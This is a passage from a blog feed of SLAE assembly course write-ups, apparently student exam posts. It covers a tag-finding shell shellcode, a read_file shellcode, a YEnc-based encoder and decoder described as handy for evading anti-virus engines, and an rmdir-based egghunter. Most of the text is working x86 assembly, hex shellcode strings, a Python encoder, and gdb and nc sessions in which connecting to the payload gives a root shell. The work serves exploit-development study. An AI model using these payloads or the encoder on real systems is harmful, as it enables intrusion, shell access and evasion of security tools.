   0x004020ac &lt;+44&gt;:    jns    0x4020a6 &lt;shellcode+38&gt;
   0x004020ae &lt;+46&gt;:    push   0xb
   0x004020b0 &lt;+48&gt;:    pop    eax
   0x004020b1 &lt;+49&gt;:    cdq
   0x004020b2 &lt;+50&gt;:    push   edx
   0x004020b3 &lt;+51&gt;:    push   0x68732f2f
   0x004020b8 &lt;+56&gt;:    push   0x6e69622f
   0x004020bd &lt;+61&gt;:    mov    ebx,esp
   0x004020bf &lt;+63&gt;:    push   edx
   0x004020c0 &lt;+64&gt;:    push   ebx
   0x004020c1 &lt;+65&gt;:    mov    ecx,esp
   0x004020c3 &lt;+67&gt;:    int    0x80
   0x004020c5 &lt;+69&gt;:    add    BYTE PTR [eax],al
End of assembler dump.
$2 = [ PF ZF IF ]
---Type &lt;return&gt; to continue, or q &lt;return&gt; to quit---

Breakpoint 2, 0x0040208e in shellcode ()
(gdb) x/6x $esp
0xbffff158:     0x00000a00      0xbffff168      0x00000a00      0x00000040
0xbffff168:     0x00000000      0x00400b44
(gdb) x/x $esp+4
0xbffff15c:     0xbffff168
(gdb) i r esi
esi             0xbffff168       -1073745560
</code></pre>

<p>The next block of code checks if the received tag matches the one configured (SLAE). If the zero flag isn&rsquo;t set, the next file descriptor is checked, by incrementing the memory location mentioned above. Since in this scenario only one client will be connecting, its assigned file descriptor will also be 4:</p>

<pre><code>Dump of assembler code for function shellcode:
   0x00402080 &lt;+0&gt;:     xor    ebx,ebx
   0x00402082 &lt;+2&gt;:     push   ebx
   0x00402083 &lt;+3&gt;:     mov    esi,esp
   0x00402085 &lt;+5&gt;:     push   0x40
   0x00402087 &lt;+7&gt;:     mov    bh,0xa
   0x00402089 &lt;+9&gt;:     push   ebx
   0x0040208a &lt;+10&gt;:    push   esi
   0x0040208b &lt;+11&gt;:    push   ebx
   0x0040208c &lt;+12&gt;:    mov    ecx,esp
   0x0040208e &lt;+14&gt;:    xchg   bl,bh
   0x00402090 &lt;+16&gt;:    inc    WORD PTR [ecx]
   0x00402093 &lt;+19&gt;:    push   0x66
   0x00402095 &lt;+21&gt;:    pop    eax
   0x00402096 &lt;+22&gt;:    int    0x80
   0x00402098 &lt;+24&gt;:    cmp    DWORD PTR [esi],0x45414c53
   0x0040209e &lt;+30&gt;:    jne    0x402090 &lt;shellcode+16&gt;
=&gt; 0x004020a0 &lt;+32&gt;:    pop    edi
   0x004020a1 &lt;+33&gt;:    mov    ebx,edi
   0x004020a3 &lt;+35&gt;:    push   0x2
   0x004020a5 &lt;+37&gt;:    pop    ecx
   0x004020a6 &lt;+38&gt;:    push   0x3f
   0x004020a8 &lt;+40&gt;:    pop    eax
   0x004020a9 &lt;+41&gt;:    int    0x80
   0x004020ab &lt;+43&gt;:    dec    ecx
   0x004020ac &lt;+44&gt;:    jns    0x4020a6 &lt;shellcode+38&gt;
   0x004020ae &lt;+46&gt;:    push   0xb
   0x004020b0 &lt;+48&gt;:    pop    eax
   0x004020b1 &lt;+49&gt;:    cdq
   0x004020b2 &lt;+50&gt;:    push   edx
   0x004020b3 &lt;+51&gt;:    push   0x68732f2f
   0x004020b8 &lt;+56&gt;:    push   0x6e69622f
   0x004020bd &lt;+61&gt;:    mov    ebx,esp
   0x004020bf &lt;+63&gt;:    push   edx
   0x004020c0 &lt;+64&gt;:    push   ebx
   0x004020c1 &lt;+65&gt;:    mov    ecx,esp
   0x004020c3 &lt;+67&gt;:    int    0x80
   0x004020c5 &lt;+69&gt;:    add    BYTE PTR [eax],al
End of assembler dump.
$15 = [ PF ZF IF ]
---Type &lt;return&gt; to continue, or q &lt;return&gt; to quit---q
Quit
(gdb) i r ecx
ecx             0xbffff158       -1073745576
(gdb) x/x 0xbffff158
0xbffff158:     0x00000004
(gdb) x/4x $esi
0xbffff168:     0x53    0x4c    0x41    0x45
</code></pre>

<p>The above skeleton C file can also be used to test the shellcode. Sending the correct tag yields a shell:</p>

<pre><code class="bash">$ make PROG=shell-find-tag
nasm  -f elf32 -o shell-find-tag.o shell-find-tag.asm
ld -N -zexecstack -o shell-find-tag shell-find-tag.o
08048080 &lt;_start&gt;:
 8048080:       31 db                   xor    ebx,ebx
 8048082:       53                      push   ebx
 8048083:       89 e6                   mov    esi,esp
 8048085:       6a 40                   push   0x40
 8048087:       b7 0a                   mov    bh,0xa
 8048089:       53                      push   ebx
 804808a:       56                      push   esi
 804808b:       53                      push   ebx
 804808c:       89 e1                   mov    ecx,esp
 804808e:       86 fb                   xchg   bl,bh

08048090 &lt;tag_restart&gt;:
 8048090:       66 ff 01                inc    WORD PTR [ecx]
 8048093:       6a 66                   push   0x66
 8048095:       58                      pop    eax
 8048096:       cd 80                   int    0x80
 8048098:       81 3e 53 4c 41 45       cmp    DWORD PTR [esi],0x45414c53
 804809e:       75 f0                   jne    8048090 &lt;tag_restart&gt;
 80480a0:       5f                      pop    edi
 80480a1:       89 fb                   mov    ebx,edi
 80480a3:       6a 02                   push   0x2
 80480a5:       59                      pop    ecx

080480a6 &lt;tag_dup2_loop&gt;:
 80480a6:       6a 3f                   push   0x3f
 80480a8:       58                      pop    eax
 80480a9:       cd 80                   int    0x80
 80480ab:       49                      dec    ecx
 80480ac:       79 f8                   jns    80480a6 &lt;tag_dup2_loop&gt;
 80480ae:       6a 0b                   push   0xb
 80480b0:       58                      pop    eax
 80480b1:       99                      cdq
 80480b2:       52                      push   edx
 80480b3:       68 2f 2f 73 68          push   0x68732f2f
 80480b8:       68 2f 62 69 6e          push   0x6e69622f
 80480bd:       89 e3                   mov    ebx,esp
 80480bf:       52                      push   edx
 80480c0:       53                      push   ebx
 80480c1:       89 e1                   mov    ecx,esp
 80480c3:       cd 80                   int    0x80
Shellcode size: 69
\x31\xdb\x53\x89\xe6\x6a\x40\xb7\x0a\x53\x56\x53\x89\xe1\x86\xfb\x66\xff\x01\x6a\x66\x58\xcd\x80\x81\x3e\x53\x4c\x41\x45\x75\xf0\x5f\x89\xfb\x6a\x02\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80
cc -DSHELLCODE=`asm-opcodes shell-find-tag` -W -Wall -fno-stack-protector -zexecstack -o shellcode skel.c
</code></pre>

<pre><code class="bash"># ./shellcode 4242
Connection from 127.0.0.1:47590
$ nc -v 127.0.0.1 4242
Connection to 127.0.0.1 4242 port [tcp/*] succeeded!
HELO
id
SLAE
id
uid=0(root) gid=0(root) groups=0(root)
</code></pre>

<h3>3. linux/x86/read_file</h3>

<p>The final shellcode reads the configured file and writes its contents to a specific file descriptor. Since the above skeleton C program will be used, the contents are going to be written to the remote client over the network on descriptor 4. Since it needs to obtain the absolute address in memory of the path to open, it is using the well known JMP/CALL/POP technique to avoid having \x00 characters in the resulting shellcode:</p>

<pre><code class="asm">global _start

section .text
_start:
    jmp short read_eip

read_start:
    mov eax, 0x5
    ; int open(const char *, int)
    pop ebx                 ; path from the jmp/call/pop technique
    xor ecx, ecx            ; flags
    int 0x80

    mov ebx, eax            ; fd (from the return code of open(2))
    mov eax, 0x3
    ; ssize_t read(int, void *, size_t)
    mov edi, esp            ; save contents to the stack
    mov ecx, edi            ; buf
    mov edx, 0x1000         ; count
    int 0x80

    mov edx, eax            ; count (from the return code of read(2))
    mov eax, 0x4
    ; ssize_t write(int, const void *, size_t)
    mov ebx, 0x4            ; fd
    ; ecx is already pointing to the correct location
    int 0x80

    mov eax, 0x1
    ; void exit(int)
    mov ebx, 0x0            ; status
    int 0x80

read_eip:
    call dword read_start
    path: db "/proc/version", 0x00
</code></pre>

<pre><code class="bash retrieving the system call numbers">$ asm-syscall open
#define __NR_open 5
0x5
$ asm-syscall read
#define __NR_read 3
0x3
$ asm-syscall write
#define __NR_write 4
0x4
$ asm-syscall exit
#define __NR_exit 1
0x1
</code></pre>

<p>By making use of the listening skeleton server as before, the contents of the /proc/version file are echoed back to the remote client:</p>

<pre><code class="bash"># ./shellcode 4242
Connection from 127.0.0.1:47624
$ nc -v 127.0.0.1 4242
Connection to 127.0.0.1 4242 port [tcp/*] succeeded!
Linux version 4.9.0-6-686-pae (debian-kernel@lists.debian.org) (gcc version 6.3.0 20170516 (Debian 6.3.0-18+deb9u1) ) #1 SMP Debian 4.9.88-1+deb9u1 (2018-05-07)
</code></pre>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[SLAE 0x04: Encoder]]></title>
    <link href="http://tcunha.github.io/blog/2018/07/12/slae-0x04-encoder/"/>
    <updated>2018-07-12T20:57:49+00:00</updated>
    <id>http://tcunha.github.io/blog/2018/07/12/slae-0x04-encoder</id>
    <content type="html"><![CDATA[<pre><code>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:

http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert

Student-ID: SLAE-1154
</code></pre>

<p>This one details the use of an encoding scheme to encode the shellcode with and decode it subsequently on runtime, which is rather handy to evade anti-virus engines.</p>

<p>I&rsquo;ve decided to use <a href="http://www.yenc.org/yenc-draft.1.3.txt">YEnc</a> (draft 1.3). YEnc is used to encode binary data to be transmitted by email or newsgroups and uses the complete 8-bit character set, thus making its output only 1-2% larger than the original.</p>

<p>Basically, the encoding process consists of for any given character, increment its ASCII value by 42, modulo 256. Next, if the resulting character is a forbidden one (0x00, 0x0a, 0x0d and 0x3d), output the escape 0x3d character and increment the previous resulting character by 64, modulo 256.</p>

<p>The encoder does not strictly follow the draft, since it will not use the header, trailer and the CRC32 checksum.</p>

<pre><code class="python">#!/usr/bin/python

# Follows YEnc draft 1.3 with regards to the encoding process. No header or
# trailer will be used by the decoder, nor will the CRC32.
#
# An encoded character is equal to its original ASCII value plus 42, modulo 256.
# In case of a special character is detected (0x00, 0x0a, 0x0d and 0x3d), the
# resulting encoded character is prefixed with the escape 0x3d character and its
# already encoded result (with the above) will be incremented 64, modulo 256.

import sys

if len(sys.argv) == 1:
    sys.exit("usage: opcodes")
print "Original shellcode size: " + str(len(sys.argv[1]))

enc = list()
for c in sys.argv[1]:
    c = (ord(c) + 42) % 256
    if c == 0x00 or c == 0x0a or c == 0x0d or c == 0x3d:
        enc.append(hex(61))
        c = (c + 64) % 256                  # critical character; double encode
    enc.append(hex(c))                      # regular character

print "Encoded shellcode size: " + str(len(enc))
print ",".join(enc)
</code></pre>

<pre><code class="bash encoder in action">$ opcodes=`asm-opcodes ../0x01-bind/bind`; ./encoder.py `echo -e $opcodes`
Original shellcode size: 82
Encoded shellcode size: 83
0x5b,0xea,0x5b,0x20,0xc3,0x90,0xe2,0x91,0x2b,0x94,0x2c,0x85,0x94,0x2b,0x83,0xf7,0xaa,0xbd,0x90,0xe2,0x93,0x2b,0x80,0x90,0x92,0x3a,0xbc,0x90,0x94,0x2c,0xb3,0xb,0x94,0x3a,0x84,0xf7,0xaa,0x90,0xe2,0x95,0x2b,0x5b,0xf3,0xf7,0xaa,0x21,0xb,0x90,0xe2,0x96,0x2b,0xf7,0xaa,0xbd,0x6b,0x6b,0x94,0x69,0x82,0xf7,0xaa,0x73,0xa3,0x22,0x7a,0xda,0x35,0x92,0x98,0x59,0x9d,0x92,0x92,0x59,0x59,0x8c,0x93,0xb3,0x3d,0x4d,0x6b,0xf7,0xaa
</code></pre>

<p>The resulting shellcode is using the FPU <a href="https://c9x.me/x86/html/file_module_x86_id_101.html">fldz</a> and <a href="(https://c9x.me/x86/html/file_module_x86_id_119.html">fstenv</a> instructions to get the absolute address of the shellcode. Due to the decoding process having to discard the escape characters, it is also pushing the final decoded characters to the stack instead of the data section, where it would imply having to overwrite the escape characters:</p>

<pre><code class="asm">global _start

section .text
_start:
    xor ecx, ecx
    mul ecx                         ; make eax and edx zero, as well

    fldz                            ; retrieve shellcode address via fldz
    jmp decoder_pc

    ; the shellcode address is 4 bytes below of fldz
    decoder_shellcode: db SHELLCODE
    ; get the shellcode length by using the $ identifier (which evaluates to
    ; the current address)
    decoder_length: equ $ - decoder_shellcode

decoder_pc:
    ; the FPU structure in memory contains the address of the last FPU
    ; instruction on byte 0xc (the previous 3 bytes are composed of the
    ; control, status and tag word)
    fstenv [esp - 0xc]
    pop eax
    lea esi, [eax + 0x4]            ; the shellcode is 4 bytes below

    mov cl, decoder_length
decoder_loop:
    cmp byte [esi], 0x3d            ; check if it is a regular character
    jnz decoder_regular             ; not an escaped character

    inc esi                         ; grab the next character, instead
    sub byte [esi], 0x40            ; per the draft, subtract 0x40
    dec ecx                         ; the escape character was skipped
decoder_regular:
    sub byte [esi], 0x2a            ; per the draft, subtract 0x2a
    mov al, [esi]                   ; can't mov m8, m8
    mov [esp], al                   ; move decoded character to the stack
    inc esi                         ; go to the next character
    inc esp                         ; increase stack for the next one
    inc edx                         ; save number of copied characters
    loop decoder_loop

    ; before jumping to the stack, its pointer needs to be adjusted by the
    ; number of copied characters; besides this also avoids the shellcode
    ; potentially overwriting itself with push instructions
    sub esp, edx
    jmp esp                         ; finally jump to the shellcode
</code></pre>

<p>As usual, the configure script in the base directory can be used to tweak the code. In this case, the new -s command-line option should point to the shellcode to encode:</p>

<pre><code class="bash">$ ./configure -s 0x02-reverse/reverse
Using listening port: 0x9210
Using remote host: 0x0101017f
Using remote port: 0x9210
Using shellcode: 0x02-reverse/reverse
$ ./configure
Using listening port: 0x9210
Using remote host: 0x0101017f
Using remote port: 0x9210
Using shellcode: 0x01-bind/bind
$ cd 0x04-encoder/
$ make
nasm  -f elf32 -o decoder.o decoder.asm
ld -N -zexecstack -o decoder decoder.o
08048080 &lt;_start&gt;:
 8048080:       31 c9                   xor    ecx,ecx
 8048082:       f7 e1                   mul    ecx
 8048084:       d9 ee                   fldz
 8048086:       eb 53                   jmp    80480db &lt;decoder_pc&gt;

08048088 &lt;decoder_shellcode&gt;:
 8048088:       5b                      pop    ebx
 8048089:       ea 5b 20 c3 90 e2 91    jmp    0x91e2:0x90c3205b
 8048090:       2b 94 2c 85 94 2b 83    sub    edx,DWORD PTR [esp+ebp*1-0x7cd46b7b]
 8048097:       f7 aa bd 90 e2 93       imul   DWORD PTR [edx-0x6c1d6f43]
 804809d:       2b 80 90 92 3a bc       sub    eax,DWORD PTR [eax-0x43c56d70]
 80480a3:       90                      nop
 80480a4:       94                      xchg   esp,eax
 80480a5:       2c b3                   sub    al,0xb3
 80480a7:       0b 94 3a 84 f7 aa 90    or     edx,DWORD PTR [edx+edi*1-0x6f55087c]
 80480ae:       e2 95                   loop   8048045 &lt;decoder_length+0x8047ff2&gt;
 80480b0:       2b 5b f3                sub    ebx,DWORD PTR [ebx-0xd]
 80480b3:       f7 aa 21 0b 90 e2       imul   DWORD PTR [edx-0x1d6ff4df]
 80480b9:       96                      xchg   esi,eax
 80480ba:       2b f7                   sub    esi,edi
 80480bc:       aa                      stos   BYTE PTR es:[edi],al
 80480bd:       bd 6b 6b 94 69          mov    ebp,0x69946b6b
 80480c2:       82 f7 aa                xor    bh,0xaa
 80480c5:       73 a3                   jae    804806a &lt;decoder_length+0x8048017&gt;
 80480c7:       22 7a da                and    bh,BYTE PTR [edx-0x26]
 80480ca:       35 92 98 59 9d          xor    eax,0x9d599892
 80480cf:       92                      xchg   edx,eax
 80480d0:       92                      xchg   edx,eax
 80480d1:       59                      pop    ecx
 80480d2:       59                      pop    ecx
 80480d3:       8c 93 b3 3d 4d 6b       mov    WORD PTR [ebx+0x6b4d3db3],ss
 80480d9:       f7                      .byte 0xf7
 80480da:       aa                      stos   BYTE PTR es:[edi],al

080480db &lt;decoder_pc&gt;:
 80480db:       9b d9 74 24 f4          fstenv [esp-0xc]
 80480e0:       58                      pop    eax
 80480e1:       8d 70 04                lea    esi,[eax+0x4]
 80480e4:       b1 53                   mov    cl,0x53

080480e6 &lt;decoder_loop&gt;:
 80480e6:       80 3e 3d                cmp    BYTE PTR [esi],0x3d
 80480e9:       75 05                   jne    80480f0 &lt;decoder_regular&gt;
 80480eb:       46                      inc    esi
 80480ec:       80 2e 40                sub    BYTE PTR [esi],0x40
 80480ef:       49                      dec    ecx

080480f0 &lt;decoder_regular&gt;:
 80480f0:       80 2e 2a                sub    BYTE PTR [esi],0x2a
 80480f3:       8a 06                   mov    al,BYTE PTR [esi]
 80480f5:       88 04 24                mov    BYTE PTR [esp],al
 80480f8:       46                      inc    esi
 80480f9:       44                      inc    esp
 80480fa:       42                      inc    edx
 80480fb:       e2 e9                   loop   80480e6 &lt;decoder_loop&gt;
 80480fd:       29 d4                   sub    esp,edx
 80480ff:       ff e4                   jmp    esp
Shellcode size: 129
\x31\xc9\xf7\xe1\xd9\xee\xeb\x53\x5b\xea\x5b\x20\xc3\x90\xe2\x91\x2b\x94\x2c\x85\x94\x2b\x83\xf7\xaa\xbd\x90\xe2\x93\x2b\x80\x90\x92\x3a\xbc\x90\x94\x2c\xb3\x0b\x94\x3a\x84\xf7\xaa\x90\xe2\x95\x2b\x5b\xf3\xf7\xaa\x21\x0b\x90\xe2\x96\x2b\xf7\xaa\xbd\x6b\x6b\x94\x69\x82\xf7\xaa\x73\xa3\x22\x7a\xda\x35\x92\x98\x59\x9d\x92\x92\x59\x59\x8c\x93\xb3\x3d\x4d\x6b\xf7\xaa\x9b\xd9\x74\x24\xf4\x58\x8d\x70\x04\xb1\x53\x80\x3e\x3d\x75\x05\x46\x80\x2e\x40\x49\x80\x2e\x2a\x8a\x06\x88\x04\x24\x46\x44\x42\xe2\xe9\x29\xd4\xff\xe4
cc -DSHELLCODE=`asm-opcodes decoder` -W -Wall -fno-stack-protector -zexecstack -o shellcode ../skel.c
</code></pre>

<p>Debugging with gdb(1) shows that the absolute address of the shellcode is correctly retrieved, since the address of the last FPU instruction is 0x08048084, thus putting the encoded shellcode 4 bytes below in 0x08048088:</p>

<pre><code class="bash debugging with gdb(1)">$ gdb -q decoder
Reading symbols from decoder...(no debugging symbols found)...done.
(gdb) b _start
Breakpoint 1 at 0x8048080
(gdb) r
Starting program: /attic/slae/exam/0x04-encoder/decoder
Dump of assembler code for function _start:
=&gt; 0x08048080 &lt;+0&gt;:     xor    ecx,ecx
   0x08048082 &lt;+2&gt;:     mul    ecx
   0x08048084 &lt;+4&gt;:     fldz
   0x08048086 &lt;+6&gt;:     jmp    0x80480db &lt;decoder_pc&gt;
End of assembler dump.
$1 = [ IF ]

Breakpoint 1, 0x08048080 in _start ()
(gdb) disass decoder_pc
Dump of assembler code for function decoder_pc:
   0x080480db &lt;+0&gt;:     fstenv [esp-0xc]
   0x080480e0 &lt;+5&gt;:     pop    eax
   0x080480e1 &lt;+6&gt;:     lea    esi,[eax+0x4]
   0x080480e4 &lt;+9&gt;:     mov    cl,0x53
End of assembler dump.
(gdb) b *decoder_pc+6
Breakpoint 2 at 0x80480e1
(gdb) continue
Continuing.
Dump of assembler code for function decoder_pc:
   0x080480db &lt;+0&gt;:     fstenv [esp-0xc]
   0x080480e0 &lt;+5&gt;:     pop    eax
=&gt; 0x080480e1 &lt;+6&gt;:     lea    esi,[eax+0x4]
   0x080480e4 &lt;+9&gt;:     mov    cl,0x53
End of assembler dump.
$2 = [ PF IF ]

Breakpoint 2, 0x080480e1 in decoder_pc ()
(gdb) i r eax
eax            0x8048084        134512772
(gdb) x/i $eax
   0x8048084 &lt;_start+4&gt;:        fldz
(gdb) x/4x decoder_shellcode
0x8048088 &lt;decoder_shellcode&gt;:  0x205bea5b      0x91e290c3      0x852c942b      0xf7832b94
(gdb) x/4x $eax+4
0x8048088 &lt;decoder_shellcode&gt;:  0x205bea5b      0x91e290c3      0x852c942b      0xf7832b94
(gdb) disass decoder_regular
Dump of assembler code for function decoder_regular:
   0x080480f0 &lt;+0&gt;:     sub    BYTE PTR [esi],0x2a
   0x080480f3 &lt;+3&gt;:     mov    al,BYTE PTR [esi]
   0x080480f5 &lt;+5&gt;:     mov    BYTE PTR [esp],al
   0x080480f8 &lt;+8&gt;:     inc    esi
   0x080480f9 &lt;+9&gt;:     inc    esp
   0x080480fa &lt;+10&gt;:    inc    edx
   0x080480fb &lt;+11&gt;:    loop   0x80480e6 &lt;decoder_loop&gt;
   0x080480fd &lt;+13&gt;:    sub    esp,edx
   0x080480ff &lt;+15&gt;:    jmp    esp
End of assembler dump.
(gdb) b *0x080480ff
Breakpoint 3 at 0x80480ff
(gdb) continue
Continuing.
Dump of assembler code for function decoder_regular:
   0x080480f0 &lt;+0&gt;:     sub    BYTE PTR [esi],0x2a
   0x080480f3 &lt;+3&gt;:     mov    al,BYTE PTR [esi]
   0x080480f5 &lt;+5&gt;:     mov    BYTE PTR [esp],al
   0x080480f8 &lt;+8&gt;:     inc    esi
   0x080480f9 &lt;+9&gt;:     inc    esp
   0x080480fa &lt;+10&gt;:    inc    edx
   0x080480fb &lt;+11&gt;:    loop   0x80480e6 &lt;decoder_loop&gt;
   0x080480fd &lt;+13&gt;:    sub    esp,edx
=&gt; 0x080480ff &lt;+15&gt;:    jmp    esp
End of assembler dump.
$3 = [ PF SF IF ]

Breakpoint 3, 0x080480ff in decoder_regular ()
(gdb) x/10i $esp
   0xbffff714:  xor    eax,eax
   0xbffff716:  xor    esi,esi
   0xbffff718:  cdq
   0xbffff719:  mov    ax,0x167
   0xbffff71d:  push   0x2
   0xbffff71f:  pop    ebx
   0xbffff720:  push   0x1
   0xbffff722:  pop    ecx
   0xbffff723:  int    0x80
   0xbffff725:  xchg   ebx,eax
</code></pre>

<p>Given the above, the shellcode is being correctly decoded on the stack. Executing it yields a bind shell:</p>

<pre><code class="bash executing the shellcode"># ./shellcode
Shellcode length: 129
$ ss -nlt|grep 4242
LISTEN     0      0            *:4242                     *:*
$ nc -v 127.0.0.1 4242
Connection to 127.0.0.1 4242 port [tcp/*] succeeded!
id
uid=0(root) gid=0(root) groups=0(root)
</code></pre>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[SLAE 0x03: Egghunter]]></title>
    <link href="http://tcunha.github.io/blog/2018/06/19/slae-0x03-egghunter/"/>
    <updated>2018-06-19T23:56:39+00:00</updated>
    <id>http://tcunha.github.io/blog/2018/06/19/slae-0x03-egghunter</id>
    <content type="html"><![CDATA[<pre><code>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:

http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert

Student-ID: SLAE-1154
</code></pre>

<p>This exercise consisted in using the egghunter technique, which is rather useful when a shellcode is bigger than the available space. On those circumstances, an egg can be planted right before the second stage shellcode which when found by the hunter will be executed.</p>

<p>There is an interesting resource by <a href="http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf">skape</a> which explains this concept quite well, as well as, various Linux implementations.</p>

<p>The one I came up with is based on his revisited <a href="http://man7.org/linux/man-pages/man2/access.2.html">access(2)</a> system call with some differences. I&rsquo;ve decided to instead use the <a href="http://man7.org/linux/man-pages/man2/rmdir.2.html">rmdir(2)</a> system call and to start on the very first page of the process virtual address space. Even though Linux reserves the first few pages for performance reasons and prevents a process of allocating them to avoid potential security issues related to NULL pointer dereferences on page zero, not starting the search at 0x10000 (see <a href="https://www.kernel.org/doc/Documentation/sysctl/vm.txt">vm.mmap_min_addr</a>) allows shaving off a few bytes.</p>

<p>The <a href="http://man7.org/linux/man-pages/man2/rmdir.2.html">rmdir(2)</a> system call will check if the provided address is valid. If for any reason the address can&rsquo;t be accessed (unmapped, invalid permissions, etc), then EFAULT (-14) is returned, which the egghunter should check for robustness. In that case, the next page (PAGE_SIZE) is tried until addressable memory is found.</p>

<pre><code class="bash retrieving the error code">$ asm-errno EFAULT
14
0xfffffffffffffff2
</code></pre>

<pre><code class="c rmdir(2) prototype">int rmdir(const char *pathname);
</code></pre>

<pre><code class="bash retrieving the system call number and size of page">$ asm-syscall rmdir
#define __NR_rmdir 40
0x28
$ getconf PAGE_SIZE
4096
</code></pre>

<pre><code>+----------+--------------------+
| register |       value        |
+----------+--------------------+
| eax      | 40                 |
| ebx      | address to search  |
+----------+--------------------+
</code></pre>

<p>To avoid repeating the egg twice and save space, the non-executable egg is also calculated on the fly by incrementing its value.</p>

<p>String comparison is done with the scas family, which depending on the direction flag (DF) being set or not it automatically increments or decrements the pointer to the next character. To illustrate this, consider the following program where a string is printed to the screen character by character. This is using the <a href="https://c9x.me/x86/html/file_module_x86_id_101.html">fldz</a> and <a href="https://c9x.me/x86/html/file_module_x86_id_119.html">fstenv</a> instructions to get the absolute address of the string to print:</p>

<pre><code class="asm">global _start

section .text
direction_print:
    pushad

    mov al, 0x4
    ; ssize_t write(int, const void *, size_t)
    mov bl, 0x1             ; fd
    lea ecx, [esp + 0x1c]   ; buf
    mov dl, 0x1             ; count
    int 0x80

    popad
    ret

_start:
    cld                     ; clear direction flag

    fldz                    ; retrieve the string address via fstenv
    jmp direction_pc

    ; the string is 4 bytes below of fdlz
    str: db "this is a string", 0xa

direction_loop:
    lodsb
    call direction_print
    loop direction_loop

    mov al, 0x1
    ; void exit(int)
    int 0x80

direction_pc:
    ; the FPU structure in memory contains the address of the last FPU
    ; instruction on byte 0xc (the previous 3 bytes are composed of the
    ; control, status and tag word)
    fstenv [esp - 0xc]
    pop ecx

    lea esi, [ecx + 0x4]    ; string is 4 bytes below
    push 0x11               ; string length
    pop ecx

    jmp direction_loop
</code></pre>

<pre><code class="bash">$ asm-compile direction-off.asm
$ asm-opcodes direction-off
Shellcode size: 63
\x60\xb0\x04\xb3\x01\x8d\x4c\x24\x1c\xb2\x01\xcd\x80\x61\xc3\xfc\xd9\xee\xeb\x1d\x74\x68\x69\x73\x20\x69\x73\x20\x61\x20\x73\x74\x72\x69\x6e\x67\x0a\xac\xe8\xd5\xff\xff\xff\xe2\xf8\xb0\x01\xcd\x80\x9b\xd9\x74\x24\xf4\x59\x8d\x71\x04\x6a\x11\x59\xeb\xe6
$ ./direction-off
this is a string
</code></pre>

<p>Below, the direction flag (DF) is being set, resulting in the string being printed backwards as expected:</p>

<pre><code class="diff">$ diff -u direction-off.asm direction-on.asm
--- direction-off.asm   2018-06-24 17:20:35.044465700 +0100
+++ direction-on.asm    2018-06-24 18:54:48.168812600 +0100
@@ -15,7 +15,7 @@
        ret

 _start:
-       cld                     ; clear direction flag
+       std                     ; set direction flag

        fldz                    ; retrieve the string address via fstenv
        jmp direction_pc
@@ -39,7 +39,7 @@
        fstenv [esp - 0xc]
        pop ecx

-       lea esi, [ecx + 0x4]    ; string is 4 bytes below
+       lea esi, [ecx + 0x4 + 0x11 - 1] ; string is 4 bytes below
        push 0x11               ; string length
        pop ecx
</code></pre>

<pre><code class="bash">$ asm-compile direction-on.asm
$ ./direction-on

gnirts a si siht$
</code></pre>

<p>Given all of the above, the resulting egghunter shellcode is:</p>

<pre><code class="asm">global _start

section .text
_start:
    cld                     ; clear direction flag for scasd
    xor ebx, ebx

egg_restart:
    push 0x28
    ; int rmdir(const char *)
    pop eax
    ; increment ebx to either align a page or check the next address
    inc ebx                 ; pathname
    int 0x80

    cmp al, 0xf2            ; check for a page fault on the lower bits only
    jnz egg_check           ; it's a valid page

    or bx, 0xfff            ; not an addressable page
    jmp egg_restart         ; check the next page (0xfff + 1 = PAGE_SIZE)

egg_check:
    mov eax, 0xcafebabd     ; add initial not static egg value
    inc eax                 ; increment the value to decrease the size
    mov edi, ebx            ; compare eax with edi
    scasd                   ; edi is incremented since the direction flag is zero
    jnz egg_restart         ; egg not found, try the next address

    jmp edi                 ; edi points to the shellcode to execute
</code></pre>

<p>To run the shellcode, like before, the configure command should be issued first, followed by make. The second stage payload can be specified by the <strong>STAGE2</strong> variable:</p>

<pre><code class="bash">$ ./configure
Using listening port: 0x9210
Using remote host: 0x0101017f
Using remote port: 0x9210
$ cd 0x03-egghunter/
$ STAGE2=../0x02-reverse/reverse make
nasm  -f elf32 -o egghunter.o egghunter.asm
ld -N -zexecstack -o egghunter egghunter.o
08048060 &lt;_start&gt;:
 8048060:       fc                      cld
 8048061:       31 db                   xor    ebx,ebx

08048063 &lt;egg_restart&gt;:
 8048063:       6a 28                   push   0x28
 8048065:       58                      pop    eax
 8048066:       43                      inc    ebx
 8048067:       cd 80                   int    0x80
 8048069:       3c f2                   cmp    al,0xf2
 804806b:       75 07                   jne    8048074 &lt;egg_check&gt;
 804806d:       66 81 cb ff 0f          or     bx,0xfff
 8048072:       eb ef                   jmp    8048063 &lt;egg_restart&gt;

08048074 &lt;egg_check&gt;:
 8048074:       b8 bd ba fe ca          mov    eax,0xcafebabd
 8048079:       40                      inc    eax
 804807a:       89 df                   mov    edi,ebx
 804807c:       af                      scas   eax,DWORD PTR es:[edi]
 804807d:       75 e4                   jne    8048063 &lt;egg_restart&gt;
 804807f:       ff e7                   jmp    edi
Shellcode size: 33
\xfc\x31\xdb\x6a\x28\x58\x43\xcd\x80\x3c\xf2\x75\x07\x66\x81\xcb\xff\x0f\xeb\xef\xb8\xbd\xba\xfe\xca\x40\x89\xdf\xaf\x75\xe4\xff\xe7
cc -DSHELLCODE=`asm-opcodes egghunter` -DSTAGE2=`asm-opcodes ../0x01-bind/bind` -W -Wall -fno-stack-protector -zexecstack -o shellcode skel.c
</code></pre>

<pre><code class="bash">$ nc -lv 127.1.1.1 4242
Listening on [127.1.1.1] (family 0, port 4242)
Connection from localhost 51918 received!
id
uid=0(root) gid=0(root) groups=0(root)
# ./shellcode
Egghunter length: 33
Second stage length: 70
</code></pre>
]]></content>
  </entry>
  
</feed>
